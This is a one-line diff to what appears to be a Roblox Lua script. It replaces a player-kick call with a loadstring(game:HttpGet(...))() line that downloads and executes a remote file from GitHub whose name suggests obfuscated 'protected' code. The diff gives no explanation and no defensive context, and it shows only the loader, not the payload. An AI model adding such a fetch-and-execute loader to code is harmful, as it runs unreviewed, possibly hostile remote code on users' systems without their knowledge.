@@ -1,1 +1,1 @@
-game:GetService("Players").LocalPlayer:Kick("Error Player")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/MoonSecV3Test/main/Protected_2710255928110603.txt"))()
